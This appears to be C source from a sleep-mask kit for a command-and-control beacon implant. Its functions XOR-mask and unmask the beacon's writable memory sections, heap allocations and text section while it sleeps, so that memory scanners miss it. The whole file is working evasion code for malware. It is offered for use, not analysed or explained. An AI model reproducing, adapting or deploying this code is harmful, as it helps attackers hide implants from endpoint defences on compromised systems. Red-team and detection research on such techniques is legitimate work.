

/* Mask a beacon section
 *   First call will mask
 *   Second call will unmask
 */
void mask_section(PBEACON_INFO beacon_info, PALLOCATED_MEMORY_SECTION pSection) {
   size_t offset = 0;
   PCHAR baseAddress = (PCHAR)pSection->BaseAddress;

   while (offset < pSection->VirtualSize) {
      *(baseAddress + offset) ^= beacon_info->mask[offset % MASK_SIZE];
      ++offset;
   }

   DLOG("sleep_mask: %lu bytes of the section have been modified\n", offset);
}

/* Mask the beacons sections
 *   First call will mask
 *   Second call will unmask
 */
void mask_sections(PBEACON_INFO beacon_info) {
   int regionIndex = 0, sectionIndex = 0;
   PALLOCATED_MEMORY_SECTION pSection = NULL;

   for (regionIndex = 0; regionIndex < sizeof(beacon_info->allocatedMemory.AllocatedMemoryRegions) / sizeof(ALLOCATED_MEMORY_REGION); ++regionIndex) {
      /* only look for the beacon memory region */
      if (beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Purpose != PURPOSE_BEACON_MEMORY) {
         continue;
      }

      /* found the beacon memory region now mask the individual sections */
      for (sectionIndex = 0; sectionIndex < sizeof(beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Sections) / sizeof(ALLOCATED_MEMORY_SECTION); ++sectionIndex) {
         /* Set a pointer to the Section */
         pSection = &beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Sections[sectionIndex];

         DLOG("sleep_mask: Checking Section: %d Address: %p CurrentProtect: %x MaskSection: %d\n", pSection->Label, pSection->BaseAddress, pSection->CurrentProtect, pSection->MaskSection);

         /* Check to see if the Section should not be masked */
         if (pSection->BaseAddress == NULL || pSection->MaskSection == FALSE) {
            continue;
         }

         /* Do not process the TEXT section, see [un]mask_text_section functions */
         if (pSection->Label == LABEL_TEXT) {
            continue;
         }

         /* Check the current protection has WRITE permissions */
         if (pSection->CurrentProtect == PAGE_READWRITE || pSection->CurrentProtect == PAGE_EXECUTE_READWRITE) {
            /* Valid section to mask */
            mask_section(beacon_info, pSection);
         }
      }
   }
}

/* Mask the heap memory allocated by beacon
 *   First call will mask
 *   Second call will unmask
 */
void mask_heap(PBEACON_INFO beacon_info) {
   DWORD a, b;

   if (beacon_info->heap_records == NULL) {
      return;
   }

   /* mask the heap records */
   a = 0;
   while (beacon_info->heap_records[a].ptr != NULL) {
      for (b = 0; b < beacon_info->heap_records[a].size; b++) {
         beacon_info->heap_records[a].ptr[b] ^= beacon_info->mask[b % MASK_SIZE];
      }
      a++;
   }
}

void mask_beacon(PSLEEPMASK_INFO sleepMaskInfo) {
	/* mask the sections (excluding the text section) */
	DLOGT("sleep_mask: mask sections using information from allocated memory structure\n");
	mask_sections(&sleepMaskInfo->beacon_info);

	/* mask the heap records */
	DLOGT("sleep_mask: mask the heap records\n");
	mask_heap(&sleepMaskInfo->beacon_info);

	/* mask the text section */
	DLOGT("sleep_mask: mask the text section\n");
	mask_text_section(&sleepMaskInfo->beacon_info);
}

void unmask_beacon(PSLEEPMASK_INFO sleepMaskInfo) {
	/* unmask the text section */
	DLOGT("sleep_mask: unmask the text section\n");
	unmask_text_section(&sleepMaskInfo->beacon_info);

	/* unmask the heap records */
	DLOGT("sleep_mask: unmask the heap records\n");
	mask_heap(&sleepMaskInfo->beacon_info);

	/* unmask the sections (excluding the text section) */
	DLOGT("sleep_mask: unmask sections using information from allocated memory structure\n");
	mask_sections(&sleepMaskInfo->beacon_info);
}
